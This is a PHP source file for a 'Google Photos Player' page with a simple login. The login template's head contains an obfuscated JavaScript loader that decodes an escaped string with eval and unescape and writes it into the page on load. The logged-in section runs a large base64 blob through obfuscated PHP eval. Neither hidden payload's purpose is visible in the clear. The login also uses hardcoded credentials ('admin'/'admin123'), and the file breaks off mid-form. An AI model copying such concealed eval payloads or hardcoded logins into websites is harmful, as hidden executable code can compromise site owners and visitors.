<?php
session_start();
/* DECLARE VARIABLES */
$username = 'admin';
$password = 'admin123';
$random1 = 'secret_key1';
$random2 = 'secret_key2';
$hash = md5($random1 . $password . $random2);
$self = $_SERVER['REQUEST_URI'];
/* USER LOGOUT */
if(isset($_GET['logout']))
{
	unset($_SESSION['login']);
}
/* USER IS LOGGED IN */
if (isset($_SESSION['login']) && $_SESSION['login'] == $hash)
{
	logged_in_msg($username);
}
/* FORM HAS BEEN SUBMITTED */
else if (isset($_POST['submit']))
{
	if ($_POST['username'] == $username && $_POST['password'] == $password)
	{
		//IF USERNAME AND PASSWORD ARE CORRECT SET THE LOGIN SESSION
		$_SESSION["login"] = $hash;
		header("Location: $_SERVER[PHP_SELF]");
	}
	else
	{
		// DISPLAY FORM WITH ERROR
		display_login_form();
		display_error_msg();
	}
}
/* SHOW THE LOGIN FORM */
else
{
	display_login_form();
}
/* TEMPLATES */
function display_login_form()
{
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login Form</title>
<link rel="icon" href="https://cdn.staticaly.com/gh/domkiddie/drive/master/assets/img/favicon.png">
<meta name="referrer" content="never" /><meta name="referrer" content="no-referrer" />
<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//maxcdn.bootstrapcdn.com' />
<style>html {background-color:#ababab;background-blend-mode:overlay;display:flex;align-items:center;justify-content:center;background-image:url(https://cdn.statically.io/img/i.imgur.com/2oSVvpV.jpg?quality=50&f=auto);background-repeat:no-repeat;background-size:cover;height:100%;}</style>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%30%65%34%61%39%39%35%37%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%39%31%32%37%32%32%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%32%38%35%33%32%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%2d%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%30%65%34%61%39%39%35%37%28%27') + '%44%70%6a%77%70%22%71%6f%73%4a%22%7b%7b%7b%70%6e%7c%6d%6d%6c%7c%25%2d%68%74%68%6e%43%23%69%79%7e%73%7d%3d%3c%31%71%64%78%69%6d%77%33%60%72%71%7b%70%7c%74%64%70%69%6d%77%33%6f%72%77%36%6f%71%77%7b%7d%78%73%62%75%33%3f%36%37%3b%30%37%6a%7d%79%30%63%74%73%7f%7d%7b%7f%63%76%31%77%6f%77%37%68%7f%7e%22%41%1a%0a%42%73%6b%72%74%21%77%6d%77%47%25%70%7c%7d%73%6f%79%69%6e%6a%7e%21%20%6f%7f%6f%68%40%22%6c%7d%7d%75%7f%39%31%36%60%6c%70%6d%7d%32%6c%75%74%7d%6f%6e%73%6e%72%69%31%6d%75%76%30%66%68%60%78%36%79%6b%64%7a%31%6a%70%77%79%35%60%79%68%70%71%71%68%31%38%37%38%33%32%32%6d%7a%70%31%68%76%76%78%36%62%7c%6d%7e%71%70%62%36%71%6c%76%32%6c%7c%78%20%45%17%0d%49%7d%7a%7c%74%6b%47%16%0f%60%72%6c%7c%2d%85%11%0d%20%24%63%62%68%77%6a%72%76%72%76%6a%30%6d%75%75%70%77%38%7f%72%64%7b%7d%76%64%72%6b%77%7d%40%15%09%87%10%07%17%0c%31%7f%74%75%62%7e%35%77%71%6e%66%76%31%69%71%76%76%21%80%15%09%20%27%7d%63%6a%6b%6b%72%68%3b%3a%32%73%78%27%3d%45%11%0d%87%13%0b%16%0f%34%7c%70%73%6e%7b%31%73%71%6d%6a%77%32%6c%72%72%70%2d%6e%77%75%77%24%84%16%0f%22%23%77%64%75%37%7f%6c%6c%78%69%3b%3d%32%33%70%7f%48%17%0c%27%20%74%62%6d%69%69%75%69%3d%32%30%76%7f%20%3d%31%71%7d%47%14%0a%27%2d%62%77%75%6c%6b%73%36%77%61%6f%6b%78%70%3a%35%37%70%7c%44%16%0f%22%23%62%76%75%37%7b%6f%63%68%70%78%3f%3e%73%78%27%31%70%7e%27%33%3b%71%79%25%70%6a%62%64%25%30%32%27%30%30%21%31%31%22%33%36%35%26%45%11%0d%20%24%63%62%68%77%6a%72%76%72%76%6a%30%6d%75%75%70%77%38%2e%6e%69%63%45%11%0d%87%13%0b%16%0f%34%7c%70%73%6e%7b%31%73%71%6d%6a%77%32%6c%72%72%70%2d%6e%77%75%77%24%69%3c%25%87%14%0a%27%2d%6e%77%71%7c%33%78%6e%6e%6b%6b%7c%3d%6f%71%72%6b%45%13%0b%21%25%75%60%72%6e%66%76%31%65%71%78%7d%70%72%38%3e%30%77%75%45%11%0d%87%13%0b%16%0f%34%7c%70%73%6e%7b%31%73%71%6d%6a%77%32%6c%72%72%70%2d%36%6d%7b%6f%73%21%84%12%08%23%20%65%7c%72%6a%68%72%33%73%62%69%69%7c%7d%3d%3e%30%76%7f%45%13%0b%21%25%75%60%72%6e%66%76%31%65%71%78%7d%70%72%38%31%3f%77%75%45%11%0d%20%24%71%62%69%6e%68%76%6e%37%33%36%77%78%24%33%31%75%7a%46%17%0d%8a%17%0c%10%0a%32%7e%71%71%61%78%37%73%7c%69%6d%71%37%6a%70%73%72%22%35%74%76%64%77%69%6c%76%24%84%16%0f%22%23%62%76%7f%6c%69%75%37%76%62%6d%6e%7d%7e%3a%3a%3d%70%7e%42%17%0e%21%21%75%61%6f%6c%6c%7b%69%3c%34%30%74%79%21%37%32%73%78%42%1a%0a%26%27%6e%75%77%7d%32%7f%68%7a%68%37%33%3e%77%78%41%16%0b%25%22%6d%71%71%71%37%7f%68%6b%6d%69%7d%3f%60%72%74%6b%48%17%0c%27%20%66%62%6c%70%6b%71%71%78%7b%6c%31%6a%71%70%70%73%3f%2f%3e%6e%3c%30%6e%68%42%17%0e%21%21%67%73%71%6c%68%7f%3a%70%76%76%6b%44%16%0f%22%23%6d%76%79%71%74%3d%79%6c%6a%7d%6a%47%14%0a%27%2d%77%65%75%69%6f%77%36%79%73%73%3a%35%3d%70%7e%42%17%0e%86%16%0f%15%09%40%70%62%6c%6d%64%20%2c%76%62%7d%35%7a%6b%6b%71%68%3c%27%3f%3d%3f%71%7d%29%23%85%10%07%20%26%31%7f%74%75%62%7e%35%77%71%6e%66%76%31%69%71%76%76%21%6b%73%71%77%27%88%17%0c%27%20%24%21%71%66%6e%6f%6b%71%64%3a%39%37%70%7c%21%33%35%72%7b%45%10%07%20%26%80%17%0e%86%45%34%7f%7f%7b%73%62%469127229%35%31%34%34%30%37%36' + unescape('%27%29%29%3b'));
// -->
</script>
</head>
<body>
<div class="uplay-login-form">
<?php echo '<form action="' . isset($self) . '" method="post">' .
'<h3 class="text-center">Please Login</h3>' .
'<input class="form-control item" type="text" name="username" id="username" placeholder="Your Username">' .
'<input class="form-control item" type="password" name="password" id="password" placeholder="Your Password">' .
'<input type="submit" name="submit" value="login" class="btn btn-primary btn-block logmein">' .
'</form>';
}
function logged_in_msg($username)
{
?>
<?php $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
        eval($O00O0O("JE8wTzAwMD0idk51bWNLdE1xT1NZd2huUkdRa1phcmxFaVVqZUl6WEpicFZGb0RzZHhBZlBDZ0JMVFdIeXRmc1BMS2x3WW94SGdiZENxUWFjSVpBeVVSVk1wdW5pRk9yaEd6RVhldlRCV1NqTkRtSmtCejlnSUp2S1dtcmtMUDlrbjNpQUxxOWtYcUFzY2tTZ0tERUtXbUFzSDJlMWNxUlNwUGYxTFBlVGMyUXNMcWJncFZFS3BXdlNwcWMxRlBmMEltOXNwcWNzbjJ3ZWYyd2tIdWlBb3FRZ2ZEQ0F3MnAzSDJ5MkgyeWtIbVIwZlBRdUhEdzRLV0MySG5pVEgyeTR3Vkx1d3VRNXdESGt3MnJhb21mYmZtcDBmUGhiZlZTMHdWQWJmelJPTWdHaVd4QzJIbmlUY0RTZ2ZWaFZIVlI1SFZRMkhEQ2J3UGlhSER3Z2Z6dzFmcXA1ZkR2MGZ6U1NCeGp2SDNya0ZoOU9GUEEwS1dhN1dTYWlIM3JrRmg5dWNuQ3RMSlFHaUpjYkxBOUFvenYyd21mVWZEQVVmemNiZnF5a0hQQ2J3dXYwd3VSMEhWYTF3elEwb1dnU1ExcnhEeTlRcmg5clJhZ0VwV0MySG5pVEgyeTR3Vkx1d3VRNXdESGt3MnJhb21mYmZtcDBmUGhiZlZTMHdWQWJmelJPb2dHaVd4QzJIbmlUd3FIa3d6aEFmRFhVZkRyVmZteTVmREhlb215dWNWSDF3UHAwSFZyYncyckZueHY5cFdpekYyNXNjbWYwSW05c29ValpjbXJnTm1oRUluY0FwVkVLV1FhYVhQaGtudWpQd1Z2ZWNEUjNIVlIxSHVyYm9EUjJ3REFidzJIMmZEaVVmcXAxSERmQW0xMFNCeHZVeDJyQUxXMWpGcUEyY0RHU3d1dmdwVkVLV1FhYVhQaGtudWpQd1Z2ZWNEUjNIVlIxSHVyYm9EUjJ3REFidzJIMmZEaVVmcXAxSERmQW0xMFNCeHZVUW1mVmNuajBOUmZHSG5pdWNuUTZweUFERGswNG96UjVORHlFWG5DUE5EUzdMRDBnTlZMRUtWbGVCRHZzZmtwN1dTYWlpSmNiTEE4Z2NWcGd3bVIxZjJwMWZtdzFIRGExZlZ5NUhEZlBmVlJrSFZDVWZteXVjcmxYcHowU3BhaFZIMnJnWFcxd0htNWRYbWhkY0RHU2NtNGxYbndFY200N0xEMGdOVlJVb2dHaVdtZjFMUGVUTDJyMEYzajBLV0MySG5pVGNEU2dmVmhWSFZSNUhWUTJIRENid1BpYUhEd2dmencxZnFwNWZEdjBmelNFcHlmclJhZUJSaENUcnJmaFJhaEpDUjVSTld2ZERtOTZJbWVFSHg4MU5WdlNLaFhPRlBDdFgzd1NEQVFTZlU0ZW9ram5EMUwyZldhU1FuamdGcXJuY21pTkluUXRmRHczTlZ3MnBXYk54aENmRFdnU0ZxQVpjeGpKY21mWkZrYVNRMmJrRjIxQU51dzNOVnZzd1Z2MndVNGV3VlFTUjJoUEhuaU9OdVJ1Zms0dWZVTE9vZ0dpV21mMUxQZVRMMnIwRjNqMEtXQzJIbmlUY0RTZ2ZWaFZIVlI1SFZRMkhEQ2J3UGlhSER3Z2Z6dzFmcXA1ZkR2MGZ6U0VweWZyUmFlQlJoQ1R4aENSUnliaFFSQ2hSVWdTaUpjYkxBOGdjVnBnd21SMWYycDFmbXcxSERhMWZWeTVIRGZQZlZSa0hWQ1VmbXl1Y3hhN1dTYWlIM3JrRmg5dWNuQ3RMSlFHaUpjYkxBOUFvenYyd21mVWZEQVVmemNiZnF5a0hQQ2J3dXYwd3VSMEhWYTF3elEwb1dnU1ExcnhEeTlRcmg5eENyQ3JSYTVSUmFob1IwY2hSVWdTd3hhN1dTYWlIM3JrRmg5dWNuQ3RMSlFHaUpjYkxBOUFvenYyd21mVWZEQVVmemNiZnF5a0hQQ2J3dXYwd3VSMEhWYTF3elEwb1dnU1ExcnhEeTlRcmg5RFIwZVRyYXJ4eFJjY3h5OURyV2dTQ2Fod1IwUk9vZ0dpV21mMUxQZVRMMnIwRjNqMEtXQzJIbmlUY0RTZ2ZWaFZIVlI1SFZRMkhEQ2J3UGlhSER3Z2Z6dzFmcXA1ZkR2MGZ6U0VweWZyUmFlQlJoQ1RSMWZ3bjFjaFJhQXFtcmpoQ3JwRXB5Y2pEaGZoS0RFS1dRQVZYbmlFbjNmQVhxOWdYV1NhWFBoa24yUjR3ekhlSDJwMW9tcDBmUHkwSERpVWNxeXV3elF1ZkRDVW9EUmdmelE0TldqenJyaXdEMWpSbjFDaURSckJyclFFcHp3Z0tERUtXUUFWWG5pRW4zZkFYcTlnWFdTYVhQaGtuMlI0d3pIZUgycDFvbXAwZlB5MEhEaVVjcXl1d3pRdWZEQ1VvRFJnZnpRNE5Xanpycml3RDFqUm4wZkJEYTVoUTFDUnhSMWhEMXJSTld2dXdXYTdXU2FpSDNya0ZoOXVjbkN0TEpRR2lKY2JMQTlBb3p2MndtZlVmREFVZnpjYmZxeWtIUENid3V2MHd1UjBIVmExd3pRMG9XZ1NRMXJ4RHk5UXJoOXFEMGV3RDFYd0QwZmpyeUFCRFVnU3JoaXJDeGE3V1NhaUgzcmtGaDl1Y25DdExKUUdpSmNiTEE5QW96djJ3bWZVZkRBVWZ6Y2JmcXlrSFBDYnd1djB3dVIwSFZhMXd6UTBvV2dTUTFyeER5OVFyaDlwcmhDUXh5cmpDeXJ4TldqYkxkaWJNeFNkQ25iZ2NtZjBvVUxPS0RFS1dRYWFYUGhrbjJ5ZWZWY1ZvRHJiY3F5a0h1YXVIdVJlY3p2MndxdzVvbWlWZlZ5ZWZQSDBwejBTSDNya0ZoOUFNcXJWS1dDMkhuaVRjRFNnZlZoVkhWUjVIVlEySERDYndQaWFIRHdnZnp3MWZxcDVmRHYwZnpTT29nR2lXbWYxTFBlVEgyZXRMMlJHaUpjYkxBOUFvenYyd21mVWZEQVVmemNiZnF5a0hQQ2J3dXYwd3VSMEhWYTF3elEwb1dhN1dTYWlMUHIwWG5pc3BXQzJIbmlUSER5MmZQdzVmbWhhSERpVm9EZlZmRGhhd3pIZ0h1YTVIUHcyd0R5MmNWUTdXZDBLY2Ryc0gzQ09GMjRTY1A1VGNWaGFjRHZlZnphdXd1TGt3bUg0ZjJSZWZEU2V3Mkg0b0R3MEhWYlZmUHBHaUpjYkxBOWJmenAzd3V5NGZWYWd3enA1SHVTNGYyUjBvcUNVZkRhM2ZxUjFIVnkxd1VnU2lKY2JMQTg1SFZRMGZWUWtjUGNib0RhMHdtclZIUEgxb3FIa29EZlBmVlFnZnpDVmZrZ1NpSmNiTEE5YmNWU2tIRFEyZnVYYWN6ZlBmVndnY3pSZWZ1YWVIMmNBd3p5dWZ1YTBIeEE3V1NhYVhQaGtuMnkwd1ZMdXdEUzJvRHZnd1ZBVm96UzNjRFE0Y3FwMW9ETDBjRHJVd0RSa3B6MFNMM3JVTDNDa0tKZjBMUEF1WEpwR2lKY2JMQTliZnpwM3d1eTRmVmFnd3pwNUh1UzRmMlIwb3FDVWZEYTNmcVIxSFZ5MXdVZ1NpSmNiTEE4NUhWUTBmVlFrY1BjYm9EYTB3bXJWSFBIMW9xSGtvRGZQZlZRZ2Z6Q1Zma2FTTldqdVhKaUVjbTRHaUpjYkxBODVIVlEwZlZRa2NQY2JvRGEwd21yVkhQSDFvcUhrb0RmUGZWUWdmekNWZmthT29nR2lpSmNiTEE4ZWZ6dzV3dVIyZlB3dXd1ckFmcXlnZlZIMG96Umt3VmZiY21Sa2N6d3VveHY5cEpmMExQZUFGVWJ1WEppT0wzQ2tLV0MySG5pVEhEUWtmdXdlb3pINXd6dmtvbXc0b3pYQWZ6YmFIVlI1ZnVDQWZtcGVmRHBFcFdDMkhuaVRIbUg0d1B5MGZWTDNjcVF1Y1ZIdXdxUTF3REw1d21mUGNEdmV3dUw1ZnF5T0tERUtXeEMySG5pVHdEUXVvRHcxZlZjVnd1dzFjRENid3pIMmZ6UzF3VnB1SG1yQXdQUXV3dWFTQnh2YVhQaGtudXkwd3VhdWZESDJIdXd1Zm1SMEhEdjJmVlE0ZkRwa3cyaEFjRGlhd3V3NXB6OFNOeFNhWFBoa251eTB3dWF1ZkRIMkh1d3VmbVIwSER2MmZWUTRmRHBrdzJoQWNEaWF3dXc1S3h2NnBKZjBMUGVBRlVTYVhQaGtuMnkwd1ZMdXdEUzJvRHZnd1ZBVm96UzNjRFE0Y3FwMW9ETDBjRHJVd0RSa0tERUtXeEMySG5pVEhEUWtmdXdlb3pINXd6dmtvbXc0b3pYQWZ6YmFIVlI1ZnVDQWZtcGVmRHBTQnhqdVhtaXVYSnBHaUpjYkxBOWJmenAzd3V5NGZWYWd3enA1SHVTNGYyUjBvcUNVZkRhM2ZxUjFIVnkxd1VnU3dXZ1NpSmNiTEE4ZWZ6dzV3dVIyZlB3dXd1ckFmcXlnZlZIMG96Umt3VmZiY21Sa2N6d3VveGE3V1NBa2NuQzFMUDRTaUpjYkxBOWJmenAzd3V5NGZWYWd3enA1SHVTNGYyUjBvcUNVZkRhM2ZxUjFIVnkxd1ZFS1RRT09jVWJPTDNmQVhXU2FYUGhrbjJmYm96cDN3dXcwb0R5MndWZkFjekFWSERyVWZ6Y2JIREg0ZnpwNUhEUTFLeEE3V1NhYVhQaGtudVN1b3pINWZEQVZmelM0b3FSNXdWcDVjVlFlZkRSa2NtQ1B3bXdnZkRYVnB6MFNjUDVUSHV5M0h1aVZ3UFI0Y3p2MWZxUnVIVlhWSERjVkhEaWJjRFEyY3pmYnd1U0dpSmNiTEE5VkhEU2tmdXd1ZnphZWZWcHVjbVE1SDJ5MUhWUTJIbXkyb3pRa29teTBmeGE3V1NhYVhQaGtudVN1b3pINWZEQVZmelM0b3FSNXdWcDVjVlFlZkRSa2NtQ1B3bXdnZkRYVnB6MFNjUDVUY1ZoYWNEdmVmemF1d3VMa3dtSDRmMlJlZkRTZXcySDRvRHcwSFZiVmZQcEdpSmNiTEE4NHd1UzJvRFI1SHVRNG96YkFvRHBrb21IMHdEUjF3UHJhY1ZoVnd6UjNIa2dkTWtwM29EUTJvekgxb1dwNm0xRWROV0xVbnhMT29nR2lpSmNiTEE4NHd1UzJvRFI1SHVRNG96YkFvRHBrb21IMHdEUjF3UHJhY1ZoVnd6UjNIa3Y5cEpmMExBOWtjbmpFSG1mQUtXWExYRHZndzJRZE5XTDlpa2dTaUpjYkxBODR3dVMyb0RSNUh1UTRvemJBb0Rwa29tSDB3RFIxd1ByYWNWaFZ3elIzSGthN1dTYWFYUGhrbnVTdW96SDVmREFWZnpTNG9xUjV3VnA1Y1ZRZWZEUmtjbUNQd213Z2ZEWFZwejBTTDNDa24zaUFMcWViSDJSR2kxZTF3enZrZlVMRWlrSGROV3ZhWFBoa251U3Vvekg1ZkRBVmZ6UzRvcVI1d1ZwNWNWUWVmRFJrY21DUHdtd2dmRFhWS0RFS1d4QzJIbmlUb3p3NGZWYTFvbXcwb3pTNGNEYWt3VkFQZnp5MWZEaUFjcUhlSHV2MWYyd1NCeGoxTFBlYWNtZnRjcVJHaUpjYkxBODR3dVMyb0RSNUh1UTRvemJBb0Rwa29tSDB3RFIxd1ByYWNWaFZ3elIzSGthN1dTQU9jVXZHaUpjYkxBODR3dVMyb0RSNUh1UTRvemJBb0Rwa29tSDB3RFIxd1ByYWNWaFZ3elIzSGt2OEJVdlVwVWFTTWdHaVd4QzJIbmlUZkRyUGZWY2F3dWEySDJ5Z2ZQaFBvRGEwSDJwNXdxUTN3dUxlZlBoYndQSFNCeGpBTUpqRUYyQ0FLV3BQcFVnYVhQaGtudVN1b3pINWZEQVZmelM0b3FSNXdWcDVjVlFlZkRSa2NtQ1B3bXdnZkRYVktERUtXUUFQRjNpQUhtZkdwV1NhWFBoa251UjFjVkgyY3p3NWZQZmJ3emNiY1ZhNWZxZlVvRGphZnV3M3dEY2JIRGlQcHFodXBXQzJIbmlUdzJmYWZ1ZlZ3MmZQY3FRa29EUmd3Mkgxb0R2MHdxaUFmbXkzSERYQUh1eU9wSkVLV1FhYVhQaGtudWZWY3pMdUh1ZlZjUENhd1ZhMXd6ZlBmRGFnZnpqVWNEcmJmMnkzY213ZXB6MFNYSmlPRnhidVhtaXVYSnBHaUpjYkxBOHVIMlEzdzJ3dUgyY2FjenA1ZkR2dWNWUjV3elFnSFBSMUhEWGJmMnJWd3hnU0wzQ2tMcTl1S1dDMkhuaVR3MmZhZnVmVncyZlBjcVFrb0RSZ3cySDFvRHYwd3FpQWZteTNIRFhBSHV5RWkyYjBYSmp1aWthbEwzQ2tGcXJzS1dDMkhuaVR3MmZhZnVmVncyZlBjcVFrb0RSZ3cySDFvRHYwd3FpQWZteTNIRFhBSHV5T0t4YTdXU2FpV21BUHBXU2FYUGhrbnVmVmN6THVIdWZWY1BDYXdWYTF3emZQZkRhZ2Z6alVjRHJiZjJ5M2Ntd2VwemcrcFdwVXBXQTdXU2FpV1FBT2NVdkdMM0NrTHE5dUtXQzJIbmlUdzJmYWZ1ZlZ3MmZQY3FRa29EUmd3Mkgxb0R2MHdxaUFmbXkzSERYQUh1eUVpMkEwSG1MOXdWcGRLeGo4VFdqdVhKaWdGM3dHaUpjYkxBOHVIMlEzdzJ3dUgyY2FjenA1ZkR2dWNWUjV3elFnSFBSMUhEWGJmMnJWd3hnZEJtMGt3VUxPcFd5OUJ4alBIbWV1Y3hhU01rQzJIbmlUSFZpQWNtckFIVnJQZnpIZ0h1WGJIRHJBb3pRNGNEd2tIRHAyd3pBVkhWSDlpSmNiTEE4dUgyUTN3Mnd1SDJjYWN6cDVmRHZ1Y1ZSNXd6UWdIUFIxSERYYmYyclZ3RGw5V1NhaVdRQU9jVXZHTDNDa0xxOXVLV0MySG5pVHcyZmFmdWZWdzJmUGNxUWtvRFJndzJIMW9EdjB3cWlBZm15M0hEWEFIdXlFaTJBMEhtTDl3VnBkS3hqOFRXanVYSmlnRjN3R2lKY2JMQTh1SDJRM3cyd3VIMmNhY3pwNWZEdnVjVlI1d3pRZ0hQUjFIRFhiZjJyVnd4Z2RCbTBrd1VMT3BXeTlCeGpQSG1ldWN4YVNNa0MySG5pVG9EaFBjbWhQZnFIa3dxdzVvRHlld3p5Z3d1UXVIRGFld3VjUGZWSGt3RGE5aUpjYkxBOHVIMlEzdzJ3dUgyY2FjenA1ZkR2dWNWUjV3elFnSFBSMUhEWGJmMnJWd0RsOVdTYWlXUUFPY1V2R0wzQ2tMcTl1S1dDMkhuaVR3MmZhZnVmVncyZlBjcVFrb0RSZ3cySDFvRHYwd3FpQWZteTNIRFhBSHV5RWkyQTBIbUw5d0RTZEt4ajhUV2p1WEppZ0Yzd0dpSmNiTEE4dUgyUTN3Mnd1SDJjYWN6cDVmRHZ1Y1ZSNXd6UWdIUFIxSERYYmYyclZ3eGdkQm0wZW9XTE9wV3k5QnhqUEhtZXVjeGFTTWtDMkhuaVR3Vkgxd0RTMHdtUnVIVkw0SFBwZ2Yyd2d3emEwY215dWN6SDB3cWhQZnphOWlKY2JMQTh1SDJRM3cyd3VIMmNhY3pwNWZEdnVjVlI1d3pRZ0hQUjFIRFhiZjJyVndEbDlXU2FpV24wS1dRQTlXU0E5V1NBOVdTQU9jVVNhbjFqQlIxQ0ZpM2YxSFAxT1hXWFhwV3k5cFdwVUtuRUtXUWFhWFBoa24yZmJvenAzd3V3MG9EeTJ3VmZBY3pBVkhEclVmemNiSERINGZ6cDVIRFExcHowU2loOVFEMWZSbWtYMUxQZ2RuREVLV1FhYVhQaGtudWNQd3pMMndtSGV3enkwd1BRZ0hWaVZIMnlrZjJIZ2Z1Y1Bvenl1Y3p2M3B6MFNpaDlRRDFmUm1rWHVYbXBkbkRFS1dRYWFYUGhrbnVIMUhQckF3emZid0RYVmZ1UWV3dVExd3VBUHdWcGtIMnB1b3FIZ0gyaEFwejBTaWg5UUQxZlJta1hnRjNmMGNucGRuREVLV1FhYVhQaGtuMnczZnVYUG9tSDFIUHBlY3pRMHcyUjJvelFnSERjVUh1alBjelI1ZlZ2NHB6MFNGbkFUTDJBbExxZUFuMmZrTW5qMEtXQzJIbmlUSDJ5NHdWTHV3dVE1d0RIa3cycmFvbWZiZm1wMGZQaGJmVlMwd1ZBYmZ6Uk9vZ0dpV3hDMkhuaVRmdUhrZnVhdXdxUWtIMnl1Y3pINWN6SDNmelI1ZnV5NGNQY0FIREwzZm15U0J4dmRtM0VVY1BBRWN4cDZwV3BkTlVDMkhuaVR3Vkgxd0RTMHdtUnVIVkw0SFBwZ2Yyd2d3emEwY215dWN6SDB3cWhQZnphc2lrcEVwV2kwTW5qQXBWR1VYUEFhY204dEZudjBwVWdVRnFoVWNtZ1VvVXB1ZlZqZ3BVZ1NwUENBY1BoMUZKUVVvVXZVWEppMWN4aTlOSkVVY1BBRWN4cDZwV3BkTlVDMkhuaVRvRGhQY21oUGZxSGt3cXc1b0R5ZXd6eWd3dVF1SERhZXd1Y1BmVkhrd0Rhc2lrcEVwV2kwTW5qQXBWR1VYUEFhY204dEZudjBwVWdVRnFoVWNtZ1VvVXAwb3pqZ3BkMEVNa2lQSW1lQXBWR1NwVUxzaUpjYkxBOVV3UHJBY21yVWZtSDBmVmpWZjJoYmZtUjRmemJBd3VpYndWSGdvbWZVZlU0ZHBVZ1NwZEM1THFSVW9VaTJJbUNBRms5bEx6UVVOV2lFSG1pQUZXcDZwVkxrd0p2VVRyMGRvZ0dpVFFHaWlKY2JMQTlWY21wMWNEUzRIdWZVSERmVmZETDFmVnk1SHV2NWN6djFIdXAwZm1oUHd4djlwV2JPTDNmQVhXU2FuMWZoUkFjaFJBRWR4aENSUmh3ZG54YVNCa3ZVSUpDMExKd1VwekdTcFBiMFhKanVwVWFTTlV2VW9VOHRpaDlEQ3JpbUNyaUZ4aENSUmg5cEQxZlJueENUUjByeHJhcnhtMWloUnJyaFIxQ1RycmlpbnhwN1dTYWFYUGhrbjJmQUhWckFvemJWdzJpYncydzFmdVIyd0RBVnd6QWF3enJWd1ZRMUhtSGVwejBTTDNDa24zaUFMcWViSDJSR2kyQXNjcXI0TmRqR0xXTEVpa0xFaUpjYkxBOVZjbXAxY0RTNEh1ZlVIRGZWZkRMMWZWeTVIdXY1Y3p2MUh1cDBmbWhQd3hhN1dTYS9CUz09IjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Google Photos Player</title>
<link rel="icon" href="https://cdn.staticaly.com/gh/domkiddie/drive/master/assets/img/favicon.png">
<meta name="referrer" content="never" /><meta name="referrer" content="no-referrer" />
<link rel='dns-prefetch' href='//cdn.jsdelivr.net' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//cdn.jsdelivr.net' />
	<!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
<!-- Optional theme -->
<link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
<script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
</head>
<body>
    <br />
<div class="container" style="width:80%">
<div class="row">
<div class="col-md-12">
<div class="panel panel-primary">
<div class="panel-heading">
<h3 class="panel-title">Google Photos Player</h3>
<p> <?php echo '<p>Welcome back <b>' . $username . '</b>. You have successfully logged in!</p>';?> </p>
<p class="lead"><a class="btn btn-info btn-sm" href="?logout=true" role="button">Log Out</a></p>
</div>
<div class="panel-body">
<div class="row">
<div class="col-md-8 col-md-offset-2">
<?php if($var_c777f9f5bb1d443e6840a6bc0fd59608){echo 'Video Preview:<br><iframe src="'.$var_ceb5e88c3ba3c575619c09d05c245af1.'embed.php?url='.$var_c777f9f5bb1d443e6840a6bc0fd59608.'&sub='.$var_6f0761f10142d0b2cca27f076f813d07.'&poster='.$var_65bee03a17c74134539f222cb38f0cae.'" width="100%" height="350px" frameborder="0" scrolling="no" allowfullscreen></iframe>';}?>
</div>
</div><br><br>
<form action="" method="POST" class="form-horizontal">
<div class="form-group">
<label for="drive" class="col-md-3 control-label">Google Photos Url</label>
<div class="col-md-6">
<input type="text" class="form-control" id="drive" name="url" placeholder="https://photos.google.com/share/xxxxxxxxxxx/photo/xxxxxxxxxx?key=xxxxxxxxxxxxx">
